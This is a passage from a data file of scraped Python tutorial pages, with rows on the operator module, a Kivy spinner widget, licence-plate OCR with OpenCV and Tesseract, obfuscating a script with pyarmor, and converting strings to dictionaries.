y"" operation in this function.', 'Operator module performs ""a < b"" operation in this function.', 'Operator module performs ""a <= b"" operation in this function.', 'Operator module performs ""a > b"" operation in this function.', 'Operator module performs ""a => b"" operation in this function.', 'Operator module performs ""a = b"" operation in this function.', 'Operator module performs ""a != b"" operation in this function.', 'In this tutorial, we have discussed the operator module in Python and its various function with examples.']","['2. sub(x, y): As the name suggests, the sub() function of operation is used to perform subtraction operation, and we can subtract two numbers by giving them as an argument inside the sub() function.', 'Explanation: We have subtracted the user input numbers by giving them as arguments inside the sub() function of the operation module and printed the subtraction result in the output.', 'Explanation: We have multiplied the user input numbers by giving them as arguments inside the mul() function of the operation module and printed the result.', '4. truediv(x, y): The truediv() function of the operator module is used to get the exact division value or result of the two numbers, i.e., x and y, which is given as arguments in it.', 'Explanation: We divided the user input numbers by giving them as arguments inside the truediv() function to get the exact true division result and printed it.', ""5. floordiv(x, y): As the function's name suggests, the floordiv() function is also used to divide two numbers, but it performs floor division on them and returns the floored value, i.e., greatest small integer."", 'Explanation: We have performed the floor division on the user input numbers by giving them as arguments inside the floordiv() function to get the floored value as the division result and printed it.', 'Explanation: We performed the modulus operation on the user input numbers by giving them as arguments inside the mod() function and printed the modulus result.', 'Explanation: After taking both numbers as user input, we have compared them and checked if the first number given by the user is smaller than the second number or not. Then, we printed the comparison result as true or false in the output statement.', '9. le(x, y): We can use the le(x, y) function of the operator module to establish a relationship between x & y and to check if x (first number) is smaller or equal to y (second number) or not.', '10. gt(x, y): The gt(x, y) is used to compare the two input numbers and check if the first number in the argument (x) is greater than the second number (y) or not, and it also results in the form of True or False only.', '11. ge(x, y): We can use the ge(x, y) function of the operator module to establish a relationship between x & y and to check if x (first number) is greater or equal to y (second number) or not.', '12. eq(x, y): The eq(x, y) is used to establish a relationship between the two input numbers and check if the first number in the argument (x) is equal to the second number (y), and it also results in the form of True or False only.', '13. ne(x, y): The ne(x, y) function works exactly opposite to that of the eq(x, y) function, i.e., it checks if both the numbers are given in the argument are not equal, and then it yields result in the form of true and false.']","['As the name suggests, the operator module performs various operations and operates two input numbers in a Python program. The Python operator module is one of the inbuilt modules in Python, and it provides us with a lot of functions such as add(x, y), floordiv(x, y) etc., which we can use to perform various mathematical, relational, logical and bitwise operations on two input numbers. We will learn about some of these functions of the operator module in this section and will use each of them in a Python program to understand their functioning. We have categorised the operator functions into categories according to their functioning.', ""Here, we will look at some of the major operator functions we can use to perform mathematical operations such as addition, subtraction, division etc., on two input given values. Let's have a look at the following functions where we understand them in brief by using them in a program:"", 'Explanation: After importing the operator module in the program, we added the two user input numbers by using the add() function and giving these input numbers as arguments. Then, we printed the addition of two numbers as a result of the program in the output.', 'We will look at some more functions from the operator module, but these functions belong to the relational operation category. With these functions, we can establish a relationship between any two given input numbers such as smaller one, larger one, equal etc. Look at the following operator functions from relational category with the use of each of them in a Python program:', ""8. lt(x, y): We can use this function to compare if the first number (x) given in the argument is smaller than the second input number, i.e., y. lt(x, y) will return 'true' in the output if x is smaller than y; otherwise, it will return false as a result.""]","['operator.add(x, y)', '# Import operator module', 'import operator', '# Take two input numbers from user', 'x = int(input(""Enter first integer number: ""))', 'y = int(input(""Enter second integer number: ""))', '# Adding both input numbers', 'addResult = operator.add(x, y)', '# Print result', 'print(""Addition of input numbers given by you is: "", addResult)', 'operator.sub(x, y)', '# Import operator module', 'import operator', '# Take two input numbers from user', 'x = int(input(""Enter first integer number: ""))', 'y = int(input(""Enter second integer number: ""))', '# Subtracting both input numbers', 'subResult = operator.sub(x, y)', '# Print result', 'print(""Subtraction of input numbers given by you is: "", subResult)', 'operator.mul(x, y)', '# Import operator module', 'import operator', '# Take two input numbers from user', 'x = int(input(""Enter first integer number: ""))', 'y = int(input(""Enter second integer number: ""))', '# Multiply both input numbers', 'mulResult = operator.mul(x, y)', '# Print result', 'print(""Multiplication result of numbers given by you is: "", mulResult)', 'operator.truediv(x, y)', '# Import operator module', 'import operator', '# Take two input numbers from user', 'x = int(input(""Enter first integer number: ""))', 'y = int(input(""Enter second integer number: ""))', '# Divide both input numbers', 'truedivResult = operator.truediv(x, y)', '# Print result', 'print(""True division result of numbers given by you is: "", truedivResult)', 'operator.floordiv(x, y)', '# Import operator module', 'import operator', '# Take two input numbers from user', 'x = int(input(""Enter first integer number: ""))', 'y = int(input(""Enter second integer number: ""))', '# Perform floor division', 'floordivResult = operator.floordiv(x, y)', '# Print result', 'print(""Floor division result of numbers given by you is: "", floordivResult)', 'operator.mod(x, y)', '# Import operator module', 'import operator', '# Take two input numbers from user', 'x = int(input(""Enter first integer number: ""))', 'y = int(input(""Enter second integer number: ""))', '# Perform modulus operation', 'modResult = operator.mod(x, y)', '# Print modulus result', 'print(""Result of modulus operation on numbers given by you is: "", modResult)', 'operator.pow(x, y)', '# Import operator module', 'import operator', '# Take two input numbers from user', 'x = int(input(""Enter an integer number: ""))', 'y = int(input(""Enter power value for the integer number: ""))', '# Perform power value operation', 'powResult = operator.pow(x, y)', '# Print exponentiation result', 'print(""Exponentiation result of power value of number given by you is: "", powResult)', 'operator.lt(x, y)', '# Import operator module', 'import operator', '# Take two input numbers from user', 'x = int(input(""Enter first integer number: ""))', 'y = int(input(""Enter second integer number: ""))', '# Comparing both input numbers', 'fResult = operator.lt(x, y)', '# Print result', 'print(""Is first number given by you is smaller than the second number: "", fResult)', 'operator.le(x, y)', '# Import operator module', 'import operator', '# Take two input numbers from user', 'x = int(input(""Enter first integer number: ""))', 'y = int(input(""Enter second integer number: ""))', '# Comparing both input numbers', 'fResult = operator.le(x, y)', '# Print result', 'print(""Is first number given by you is smaller or equal to the second number: "", fResult)', 'operator.gt(x, y)', '# Import operator module', 'import operator', '# Take two input numbers from user', 'x = int(input(""Enter first integer number: ""))', 'y = int(input(""Enter second integer number: ""))', '# Comparing both input numbers', 'fResult = operator.gt(x, y)', '# Print result', 'print(""Is first number given by you is greater than the second number: "", fResult)', 'operator.ge(x, y)', '# Import operator module', 'import operator', '# Take two input numbers from user', 'x = int(input(""Enter first integer number: ""))', 'y = int(input(""Enter second integer number: ""))', '# Comparing both input numbers', 'fResult = operator.ge(x, y)', '# Print result', 'print(""Is first number given by you is greater or equal to the second number: "", fResult)', 'operator.eq(x, y)', '# Import operator module', 'import operator', '# Take two input numbers from user', 'x = int(input(""Enter first integer number: ""))', 'y = int(input(""Enter second integer number: ""))', '# Comparing both input numbers', 'fResult = operator.eq(x, y)', '# Print result', 'print(""Is both input numbers given by you are equal: "", fResult)', 'operator.ne(x, y)', '# Import operator module', 'import operator', '# Take two input numbers from user', 'x = int(input(""Enter first integer number: ""))', 'y = int(input(""Enter second integer number: ""))', '# Comparing both input numbers', 'fResult = operator.ne(x, y)', '# Print result', 'print(""Is both input numbers given by you are not equal: "", fResult)']","['Enter first integer number: 234', 'Enter second integer number: 729', 'Addition of input numbers given by you is:  963', 'Enter first integer number: 727', 'Enter second integer number: 344', 'Subtraction of input numbers given by you is:  383', 'Enter first integer number: 27', 'Enter second integer number: 23', 'Multiplication result of numbers given by you is:  621', 'Enter first integer number: 25', 'Enter second integer number: 6', 'True division result of numbers given by you is:  4.166666666666667', 'Enter first integer number: 25', 'Enter second integer number: 6', 'Floor division result of numbers given by you is:  4', 'Enter first integer number: 17', 'Enter second integer number: 13', 'Result of modulus operation on numbers given by you is:  4', 'Enter an integer number: 5', 'Enter power value for the integer number you gave: 5', 'Exponentiation result of power value of number given by you is:  3125', 'Enter first integer number: 24', 'Enter second integer number: 26', 'Is first number given by you is smaller than the second number:  True', 'Enter first integer number: 23', 'Enter second integer number: 19', 'Is first number given by you is smaller or equal to the second number:  False', 'Enter first integer number: 38', 'Enter second integer number: 49', 'Is first number given by you is greater than the second number:  False', 'Enter first integer number: 23', 'Enter second integer number: 21', 'Is first number given by you is greater or equal to the second number:  True', 'Enter first integer number: 24', 'Enter second integer number: 26', 'Is both input numbers given by you are equal:  False', 'Enter first integer number: 7', 'Enter second integer number: 9', 'Is both input numbers given by you are not equal:  True']",[],[]
310,['Spinner Widget in the kivy Library of Python'],"['Kivy is the Graphical User Interface tool in Python, which is platform independent. The applications developed using Kivy can be used on IOS, Windows, Linux, and Android operating systems. The basic use of the Kivy tool in developing applications for the Android operating system but it can also be used for developing desktop applications.']","['https://www.javatpoint.com/number-plate-recognition-using-python', 'https://www.javatpoint.com/operator-module-in-python', 'https://www.javatpoint.com/number-plate-recognition-using-python', 'https://www.javatpoint.com/operator-module-in-python', 'https://www.javatpoint.com/number-plate-recognition-using-python']","['https://static.javatpoint.com/python/images/spinner-widget-in-kivy-library-of-python.png', 'https://static.javatpoint.com/python/images/spinner-widget-in-kivy-library-of-python2.png', 'https://static.javatpoint.com/python/images/spinner-widget-in-kivy-library-of-python3.png', 'https://static.javatpoint.com/python/images/spinner-widget-in-kivy-library-of-python4.png']",[],['Conclusion'],"['Spinner Widget:', 'Approach:', 'Example:', 'Example 2:']",[],"['The users can import the spinner widget of the kivy library by using the following command:', 'Now, we have to display which of the option in the menu list is selected currently. We can display the label just beside the spinner widget.']","['In this tutorial, we have discussed implementing a spinner widget of the kivy library in the Python application for giving the option of selecting the element from the menu to the users.']","['A spinner widget is used for selecting one value from a set. In the default state, a spinner shows its currently selected value. When the user clicks on the spinner, it displays a dropdown menu that shows all the other available values from which the user can select.', 'Like a combo-box, the spinner widget is also used for giving the multiple-choice option to the user for selecting anyone of its menu. The user can also attach a callback to the spinner widget for receiving the notifications on the selection of the value from the widget menu.']","['from kivy.uix.spinner import Spinner', 'from kivy.config import Config', '# In this code:', '# 0 means off', '# 1 means ON', '# Here, we can also use 0 or 1 && True or False', ""Config.set('graphics', 'resizable', True)"", '# Here, we are writing a program for Showing how to create a switch', '# first, we will import the kivy module', 'import kivy', '# the, base Class of our Application is inherited from the App class.', '# app will refers to the instance of our application', 'from kivy.app import App as app1', '# this will limit the kivy version that means', '# below this kivy version we cannot', '# use the application or software', ""kivy.require('1.9.0')"", '# The Label widget is for rendering text.', 'from kivy.uix.label import Label as lab', '# Now, we will import the spinner widget', 'from kivy.uix.spinner import Spinner as spin', '# This module consist the float layout', '# for working with FloatLayout', '# we have to import it first', 'from kivy.uix.floatlayout import FloatLayout as fl', '# Now, we will create an Application by deriving from the App class', 'class Spinner_example(app1):', '# now we will define build', 'def build_1(self):', '# here, we will create floatlayout', 'layout = fl()', '# then, we will create the spinner', '# first, we will configure spinner object and then add it to the layout', 'self.spinnerObject = spin(text = ""Option 1"",', 'values = (""Option 1"", ""Option 2"", ""Option 3"", ""Option 4"", ""Option 5"", ""Option 6""),', 'background_color =(0.784, 0.443, 0.216, 1))', 'self.spinnerObject.size_hint = (0.3, 0.2)', ""self.spinnerObject.pos_hint ={'x': .35, 'y':.75}"", 'layout.add_widget(self.spinnerObject)', '# return the layout', 'return layout;', '# for, Running the application', ""if __name__ == '__main__':"", 'Spinner_example().run()', 'from kivy.config import Config', '# In this code:', '# 0 means off', '# 1 means ON', '# Here, we can also use 0 or 1 && True or False', ""Config.set('graphics', 'resizable', True)"", '# Here, we are writing a program for Showing how to create a switch', '# first, we will import the kivy module', 'import kivy', '# the, base Class of our Application is inherited from the App class.', '# app will refers to the instance of our application', 'from kivy.app import App as app1', '# this will limit the kivy version that means', '# below this kivy version we cannot', '# use the application or software', ""kivy.require('1.9.0')"", '# The Label widget is for rendering text.', 'from kivy.uix.label import Label as lab', '# Now, we will import the spinner widget', 'from kivy.uix.spinner import Spinner as spin', '# This module consist the float layout', '# for working with FloatLayout', '# we have to import it first', 'from kivy.uix.floatlayout import FloatLayout as fl', '# Now, we will create an Application by deriving from the App class', 'class Spinner_example(app1):', '# now we will define build', 'def build_1(self):', '# here, we will create floatlayout', 'layout = fl()', '# then, we will create the spinner', '# first, we will configure spinner object and then add it to the layout', 'self.spinObject = spin(text = ""Option 1"",', 'values = (""Option 1"", ""Option 2"", ""Option 3"", ""Option 4"", ""Option 5"", ""Option 6""),', 'background_color =(0.784, 0.443, 0.216, 1))', 'self.spinObject.size_hint = (0.3, 0.2)', ""self.spinObject.pos_hint ={'x': .35, 'y':.75}"", 'layout.add_widget(self.spinObject)', 'self.spinObject.bind(text = self.on_spinner_select)', '# It will change the label information as well', '# It will add a label displaying the selection from the spinner', 'self.spinSelection = Label(text = ""Selected value in spinner widegt is: %s""', '%self.spinObject.text)', 'layout.add_widget(self.spinSelection)', ""self.spinSelection.pos_hint ={'x': .1, 'y':.3}"", '', 'return layout;', '# call back for the selection in spinner object', 'def on_spinner_select(self, spin, text):', 'self.spinSelection.text = (""Selected value in spinner widget is: %s"" %self.spinObject.text)', ""print('The spinner widget', spin, 'have text', text)"", '# Run the app', ""if __name__ == '__main__':"", 'Spinner_example().run()']",[],[],"['|||Step 1: We will import the kivy|||Step 2: We will import the kivyApp|||Step 3: We will import the label|||Step 4: We will import the Spinner|||Step 5: We will import the FLoatlayout|||Step 6: We will set the minimum version (this step is optional)|||Step 7: We will create an App class:||||||First, we will create the spinner|||Then, we will attach the labels to the spinners|||Then, we will attach a callback||||||Step 8: We will return layout/ widget/ class (as per the requirements)|||Step 9: We will run the instance of the class.||||||First, we will create the spinner|||Then, we will attach the labels to the spinners|||Then, we will attach a callback|||']"
311,['Number Plate Recognition using Python'],"['In the following tutorial, we will understand how to recognize License number plates using the Python programming language. We will utilize OpenCV for this project in order to identify the license number plates and the python pytesseract for the characters and digits extraction from the plate. We will build a Python program that automatically recognizes the License Number Plate by the end of this tutorial.']","['https://www.javatpoint.com/obfuscating-a-python-program', 'https://www.javatpoint.com/spinner-widget-in-kivy-library-of-python', 'https://www.javatpoint.com/obfuscating-a-python-program', 'https://www.javatpoint.com/spinner-widget-in-kivy-library-of-python', 'https://www.javatpoint.com/obfuscating-a-python-program']",['https://static.javatpoint.com/python/images/number-plate-recognition-using-python.png'],[],"['Understanding the Automatic License Number Plate Recognition System', 'Pre-requisites of the project', 'Understanding the Python code']","['Installation', 'Features of OpenCV', 'Step 1: Importing the required modules', 'Step 2: Performing OCR using the Tesseract Engine on Number Plates', 'Step 3: Techniques for Image Processing']","['Note: The name of the file must be the exact number in the respective image of the license plate. For instance, if the number of the license plate is ""FTY348U"", then the name of the image file will be ""FTY348U.jpg"".']","['Automatic License Number Plate Recognition Systems are available in all shapes and sizes:', 'The fact that makes Automatic License Number Plate Recognition more complicated may require operating in real-time.', 'We can install the OpenCV library using the pip installer with the help of the following syntax:', 'The same procedure will be followed in order to install the Pytesseract engine. The syntax for the same is shown below:', 'First of all, we have to import the OpenCV and pytessaract along with matplotlib, glob and OS.', 'File: anpr.py', 'File: anpr.py', 'Explanation:', 'File: anpr.py', 'Explanation:', 'Let us consider the following snippet of code to understand the technique of Image Processing.', 'File: anpr.py', 'Explanation:', 'Let us consider the following example to understand the same.', 'File: anpr.py', 'Explanation:', 'In the above snippet of code, we have some tools of the OpenCV module to resize the image, convert it into grayscale, and denoise the image.', 'Once the above steps are complete, we can pass the transformed license plate file to the Tesseract OCR engine and view the predicted result.', 'The same can be observed in the following snippet of code.', 'File: anpy.py', 'Explanation:', 'In the above snippet of code, we passed the final processed image to the Tesseract OCR engine to extract the number from the license number plate.']","['Since we have covered the theory part for the project, let us get into the coding part. We have divided the whole source code of the project into different steps for better understanding and clarity.', 'For the following step, we have to perform OCR with the help of the Tesseract Engine on License Number plates. The same can be observed in the following snippet of code.', 'Similarly, we can perform this image process for all other license number plates with not 100% accuracy. Thus, the number plate recognition model is ready.']","[""For instance, let us consider an ANPR system that is mounted on a toll road. It has to be able to detect the number plate of each vehicle passing by, OCR the characters on the plate, and then store this data in a database so the vehicle's owner can be billed for the toll."", 'Few compounding factors make ANPR extremely challenging, involving finding a set of data we can utilize in order to train a custom model for ANPR. Large, robust datasets of ANPR that are utilized to train state-of-the-art models are tightly guarded and hardly (if ever) released publicly:', 'We will use the Python OpenCV library. It is an open-source library for machine learning and offers a common infrastructure for computer vision. We will also use Pytesseract for the project. Pytesseract is a Tesseract-OCR Engine to read images type and extract the details available in the image.', 'In the above snippet of code, we have specified the path to the image files of the License number plate using the OS module. We have also defined two empty lists as NP_list and predicted_NP. We have then appended the actual number plate to the list using the append() function. We then used the OpenCV module to read each number plate image file and stored them in the NP_img variable. We have then passed each number plate image file to the Tesseract OCR engine with the help of the Python library wrapper. We have then got back predicted_res for the number plate and append it in a list and compare it with the genuine one.', 'Now, since we have the plates predicted but we don""t know the prediction. So, in order to view the data and prediction, we will perform a bit of visualization, as shown below. We will also be estimating the accuracy of the prediction without the help of any core function.', ""In the above snippet of code, we have defined a function calculating the predicted accuracy. Within the function, we used the for-loop to iterate through the list of original number plates and the predicted ones and checked if they matched. We have also checked the accuracy on the basis of the number's length for getting better and appropriate results."", 'We can observe that the Tesseract OCR engine mostly predicts all of the license plates correctly with a rate of 100% accuracy. The Tesseract OCR engine predicted incorrectly for the number plates, and we will apply the image processing technique on those number plate files and pass them to the Tesseract OCR again. We can increase the accuracy rate of the Tesseract Engine for the number plates of the incorrectly predicted number plates by applying the techniques of image processing.', 'In the above snippet of code, we have imported the image module from the matplotlib library and used the for-loop to extract the image from the designated folder. We have then used the imread() function to read the extracted image. We have then used the plot module of the matplotlib library to display the image for the users.']","['$ pip install opencv-python', '$ pip install pytesseract', '# importing the required modules', 'import pytesseract', 'import matplotlib.pyplot as plt', 'import cv2', 'import glob', 'import os', '# specifying the path to the number plate images folder as shown below', 'file_path = os.getcwd() + ""/license_plates/**/*.jpg""', 'NP_list = []', 'predicted_NP = []', 'for file_path in glob.glob(file_path, recursive = True):', 'NP_file = file_path.split(""/"")[-1]', 'number_plate, _ = os.path.splitext(NP_file)', ""'''"", 'Here we will append the actual number plate to a list', ""'''"", 'NP_list.append(number_plate)', ""'''"", 'Reading each number plate image file using openCV', ""'''"", 'NP_img = cv2.imread(file_path)', ""'''"", 'We will then pass each number plate image file', 'to the Tesseract OCR engine utilizing the Python library', 'wrapper for it. We get back predicted_res for', 'number plate. We append the predicted_res in a', 'list and compare it with the original number plate', ""'''"", ""predicted_res = pytesseract.image_to_string(NP_img, lang ='eng',"", ""config ='--oem 3 --psm 6 -c tessedit_char_whitelist = ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')"", 'filter_predicted_res = """".join(predicted_res.split()).replace("":"", """").replace(""-"", """")', 'predicted_NP.append(filter_predicted_res)', 'print(""Original Number Plate"", ""\\t"", ""Predicted Number Plate"", ""\\t"", ""Accuracy"")', 'print(""--------------------"", ""\\t"", ""-----------------------"", ""\\t"", ""--------"")', 'def estimate_predicted_accuracy(ori_list, pre_list):', 'for ori_plate, pre_plate in zip(ori_list, pre_list):', 'acc = ""0 %""', 'number_matches = 0', 'if ori_plate == pre_plate:', 'acc = ""100 %""', 'else:', 'if len(ori_plate) == len(pre_plate):', 'for o, p in zip(ori_plate, pre_plate):', 'if o == p:', 'number_matches += 1', 'acc = str(round((number_matches / len(ori_plate)), 2) * 100)', 'acc += ""%""', 'print(ori_plate, ""\\t"", pre_plate, ""\\t"", acc)', 'estimate_predicted_accuracy(NP_list, predicted_NP)', 'import matplotlib.image as mpimg', 'for img in os.listdir(""D://Python//License_Plate""):', 'test_NP = mpimg.imread(""W5KHN.jpg"")', 'plt.imshow(test_NP)', ""plt.axis('off')"", ""plt.title('W5KHN license plate')"", 'plt.show()', '# image resizing', 'resize_test_NP = cv2.resize(', 'test_NP, None, fx = 2, fy = 2,', 'interpolation = cv2.INTER_CUBIC)', '# converting image to grayscale', 'grayscale_resize_test_NP = cv2.cvtColor(', 'resize_test_NP, cv2.COLOR_BGR2GRAY)', '# denoising the image', 'gaussian_blur_NP = cv2.GaussianBlur(', 'grayscale_resize_test_NP, (5, 5), 0)', ""new_pre_res_W5KHN = pytesseract.image_to_string(gaussian_blur_NP, lang ='eng')"", 'filter_new_pre_res_W5KHN = """".join(new_pre_res_W5KHN.split()).replace("":"", """").replace(""-"", """")', 'print(filter_new_pre_res_W5KHN)']","['Original Number Plate    Predicted Number Plate      Accuracy', '--------------------     -----------------------     --------', 'DL3CAM0857               DL3CAM0857                  100 %', 'MD06NYW                  MDOGNNS                     40 %', 'TN21TC706                TN21TC706                   100 %', 'TN63DB5481               TN63DB5481                  100 %', 'UP14DR4070               UP14DR4070                  100 %', 'W5KHN                    WSKHN                       80 %', 'W5KHN']",[],"['|||ANPR executed in measured lighting situations with predictable number plate types can utilize basic techniques for image processing.|||More advanced ANPR systems use dedicated object detectors, like HOG + Linear SVM, SSDs, YOLO, and Faster R-CNN to localize license number plates in images.|||State-of-the-art ANPR software uses Recurrent Neural Networks (RNNs) and Long Short-Term Memory networks (LSTMs) in order to aid in better OCRing of the text from the number plates themselves.|||Even more advanced ANPR systems utilize specialized neural network architectures in order to preprocess and clean images before they are OCRed, thereby developing the accuracy of ANPR.||||||These datasets consist of sensitive identifying details associated with the vehicle, driver, and location.|||The datasets of ANPR are tedious to curate, needing an unbelievable time investment and staff hours to interpret.|||The contracts of ANPR with local and federal governments tend to be extremely reasonable. It is often not the trained model that is valuable; however, instead of the dataset that a specified company has curated.|||For the same cause, we will observe ANPR industries acquired not for their ANPR system but for the data itself.||||||In the following Python project, we will utilize the following features of OpenCV in order to identify the number plate in the input image:|||Gaussian Blur: Here, we will use a Gaussian Kernel for image smoothening. This technique is quite efficient for the removal of Gaussian noise. OpenCV offers a function called the GaussianBlur() function for this task.|||Morphological Transformation: These are the operations grounded on image shapes and are processed on binary images. The fundamental morphological operations include Opening, Closing, Erosion, Dilation and many more. Some of the functions offered in OpenCV are as follows:||||||cv2.erode()|||cv2.dilate()|||cv2.morphologyEx()||||||Sobel: Here, we will calculate the derivatives from the image. This feature is significant for various tasks based on the vision of the computer. With the help of these derivatives, we can calculate the gradients and a higher alteration in gradient denotes a noteworthy change in the image. OpenCV offers a Sobel() function in order to calculate Sobel operators.|||Contours: Contours are the curves that consist of all the continuous points of the same intensity. These curves are quite useful utilities for the recognition of the object. OpenCV offers the findContours() function for this feature.||||||Image Resizing: We can resize the image file by a factor of 2x in both the horizontal and vertical directions with the help of resize.|||Converting to Gray-scale: Then, we can convert the resized image file to grayscale in order to optimize the detection and reduce the number of colours available in the image drastically, which will allow us to detect the number plates easily.|||Denoising the Image: We can use the Gaussian Blur technique to denoise the images. It makes the edges of the image clearer and smoother, making the characters more readable.|||']"
312,['Obfuscating a Python program'],"['In the following tutorial, we will understand how to obfuscate a python program. We will use a Python package known as pyarmor for Obfuscation.']","['https://www.javatpoint.com/convert-string-to-dictionary-in-python', 'https://www.javatpoint.com/number-plate-recognition-using-python', 'https://www.javatpoint.com/convert-string-to-dictionary-in-python', 'https://www.javatpoint.com/number-plate-recognition-using-python', 'https://www.javatpoint.com/convert-string-to-dictionary-in-python']","['https://static.javatpoint.com/python/images/obfuscating-a-python-program.png', 'https://static.javatpoint.com/python/images/obfuscating-a-python-program2.png', 'https://static.javatpoint.com/python/images/obfuscating-a-python-program3.png', 'https://static.javatpoint.com/python/images/obfuscating-a-python-program4.png', 'https://static.javatpoint.com/python/images/obfuscating-a-python-program5.png']",[],"['Creating a basic function', 'Encrypting the file using pyarmor', 'Importing the Inference function']",[],[],"['So, let""s get started.', 'Let us consider the following snippet of code for the inference function.', 'File: func.py', 'Explanation:', 'Now, let us save this python file in a folder.', 'The process of encrypting the file with the help of pyarmor is divided into two steps:', 'Step 1: Installing the pyarmor package', 'We can install the pyarmor package using the pip installer as shown below:', 'Step 2: Encrypting the python file', 'We can encrypt the file by typing the following command in the command prompt.', 'Now, let us implement the above command on the func.py file.', 'Now, if we open the folder consisting of the original func.py file, we will observe a new subfolder created known as dist.', 'Within the dist folder, we will find another folder as pytransform and an encrypted func.py file.', 'Now, let us see the contents inside this file.', 'File: func.py (encrypted)', 'However, if we would like to do some modifications to the actual func.py script, we have to start from step 1 continue following the same steps.', 'Let us consider the following snippet of code that we have to type within the new.py file.', 'File: new.py', 'Explanation:']","['In the following tutorial, we will be using a function consisting of the above capabilities to address the above problems. We will be using the pyarmor python library for the Obfuscation of any Python code.', 'We will start by creating a new Python program file in order to implement Obfuscation on Python code. Within the file, we will define an inference function and encrypt it later.', 'Once we are done, until this section, now let us try importing this encrypted func.py in a new python file known as new.py, which we created within the dist folder.', ""The mandatory keys that allow us to decrypt the func.py at run-time are taken care of using pyarmor. Its presence exists in the pytransform folder; hence, creating the code unreadable to other's eyes."", 'In the above snippet of code, we have imported the inference function of the func.py in the new python file that we created as new.py. We have then executed that function with the same configuration as of the func.py.']","['We might sometimes come across a scenario where we have to deliver the code directly to a client for certain reasons. However, we will lose control of the code by performing such a function. In such cases, we might encrypt the script to protect it, retain the control, and include few fallback conditions for controlling the dependency, just like if we delivered code to use only for a certain amount of time.', 'In the above snippet of code, we have imported some required modules. We then defined an inference function as infer(), which accepts two parameters - person_name and tag = True. We have then printed a statement for the user initiating the inference function. Later, we defined a variable as atr that stores the current date and a string variable as resp. We have also assigned another variable as expiration_year to 2023. We have then used the try-exception method in order to handle any exception if raised. At last, we have used the if-else conditional statements to print a statement as per the situation. At last, we have assigned __name__ to ""__main__"" to execute the inference function.']","['# importing the required modules', 'import os', 'import json', 'import sys', 'from datetime import datetime', '# defining an inference function', 'def infer(person_name = """", tag = True):', ""'''"", 'if the present year is 2021, then inference function will execute properly, else it fails.', 'Here the attribute variable contains the string version of the date in MM-DD-YYYY format', ""'''"", 'print(""Hello "" + person_name + "", the inference function has been initiated successfully"")', ""atr = str(datetime.now().strftime('%m-%d-%Y'))"", 'resp = ""Your license has been expired, please contact us.""', 'expiration_year = int(2023)', 'try:', ""assert int(atr.split('-')[-1]) == expiration_year, resp"", 'except AssertionError as e:', 'print(resp)', 'sys.exit()', '# if the above assertion is True, it will reach until this point,', '# otherwise it will stop in the previous line.', 'if tag:', 'print(""Inference function has been done properly!"")', 'return True', 'else:', 'return False', 'if __name__ == ""__main__"":', '_ = infer(person_name = ""Peter Parker"")', ""'''"", 'Function outputs,', 'Case 1: if expiration_year = int(2021)', 'Hello Peter Parker, the inference function has been intiated successfully', 'Inference function has been done properly!', '[Finished in 0.2s]', 'Case 2: if expiration_year = int(2022)', 'Hello Peter Parker, the inference function has been intiated successfully', 'Inference function has been done properly!', '[Finished in 0.2s]', 'Case 3: if expiration_year = int(2023)', 'Hello Peter Parker, the inference function has been intiated successfully', 'You license has been expired, please contact us.', '[Finished in 0.2s]', ""'''"", '$ pip install pyarmor', '$ pyarmor obfuscate --restrict=0', '$ pyarmor obfuscate --restrict=0 func.py', 'from pytransform import pyarmor_runtime', 'pyarmor_runtime()', ""__pyarmor__(__name__, __file__, b'\\x50\\x59\\x41\\x52\\x4d\\x4f\\x52\\x00\\...', 2)"", '# importing the inference function definition inside the func.py file', 'from func import infer', '_ = infer(person_name = ""Tony Stark"")']","['Hello Peter Parker, the inference function has been initiated successfully', 'Your license has been expired, please contact us.', 'Hello Tony Stark, the inference function has been initiated successfully', 'Your license has been expired, please contact us.']",[],[]
313,['Convert string to dictionary in Python'],"['We have worked on different problems based on strings and dictionaries. In this tutorial, we will see how we can convert a string to a dictionary in Python.']","['https://www.javatpoint.com/convert-string-to-json-in-python', 'https://www.javatpoint.com/obfuscating-a-python-program', 'https://www.javatpoint.com/convert-string-to-json-in-python', 'https://www.javatpoint.com/obfuscating-a-python-program', 'https://www.javatpoint.com/convert-string-to-json-in-python']",[],[],"['Using Generator Expressions', 'Conclusion']","['Using json.loads()', 'Using ast.literal_eval()']",[],"[""Before that, let's have a quick recall of strings and dictionaries."", 'Strings are defined as a sequence of characters and are denoted using single or double inverted commas.', 'For example-', 'We can check the data type of the above variables using type().', 'Dictionaries are defined as a data structure in Python that uses key-value pairs which are enclosed in curly braces.', 'We can access the values present in the dictionary with the help of respective keys.', 'The example of a dictionary is-', ""Now let's list out the methods that can convert a string to a dictionary."", ""It's time to discuss each one of them in detail-"", 'The following program shows how we can convert a string to a dictionary using json.loads()', 'Explanation:', ""Let's understand what we have done in the above program-"", 'Now we will see how ast.literal_eval can help us to meet our objective.', 'The following program illustrates the same-', 'Explanation:', ""Let's understand what we have done in the above program-"", 'Finally, in the last example we will discuss how generator expressions can be used.', ""Let's study the given program carefully."", ""It's time to check the explanation of this approach-"", 'In this tutorial, we explored the conversion methods of string to the dictionary.']",[],[],"[""flower = 'Rose'"", ""sub = 'Python'"", ""name = 'James'"", ""Subj = {'subj1': 'Computer Science', 'subj2': 'Physics', 'subj3': 'Chemistry', 'subj4': 'Mathematics'}"", '#using json()', 'import json', '#initialising the string', 'string_1 = \'{""subj1"":""Computer Science"",""subj2"":""Physics"",""subj3"":""Chemistry"",""subj4"":""Mathematics""}\'', 'print(""String_1 is "",string_1)', '#using json.loads()', 'res_dict=json.loads(string_1)', '#printing converted dictionary', 'print(""The resultant dictionary is "",res_dict)', '#convert string to dictionary', '#using ast()', 'import ast', '#initialising the string', 'string_1 = \'{""subj1"":""Computer Science"",""subj2"":""Physics"",""subj3"":""Chemistry"",""subj4"":""Mathematics""}\'', 'print(""String_1 is "",string_1)', '#using ast.literal_eval', 'res_dict=ast.literal_eval(string_1)', '#printing converted dictionary', 'print(""The resultant dictionary is "",res_dict)', '#convert string to dictionary', '#using generator expressions', '#initialising the string', 'string_1 = ""subj1 - 10 , subj2 - 20, subj3 - 25, subj4 - 14""', 'print(""String_1 is "",string_1)', '#using strip() and split()', 'res_dict = dict((a.strip(), int(b.strip()))', ""for a, b in (element.split('-')"", ""for element in string_1.split(', ')))"", '#printing converted dictionary', 'print(""The resultant dictionary is: "", res_dict)', 'print(type(res_dict))']","['String_1 is  {""subj1"":""Computer Science"",""subj2"":""Physics"",""subj3"":""Chemistry"",""subj4"":""Mathematics""}', ""The resultant dictionary is  {'subj1': 'Computer Science', 'subj2': 'Physics', 'subj3': 'Chemistry', 'subj4': 'Mathematics'}"", 'String_1 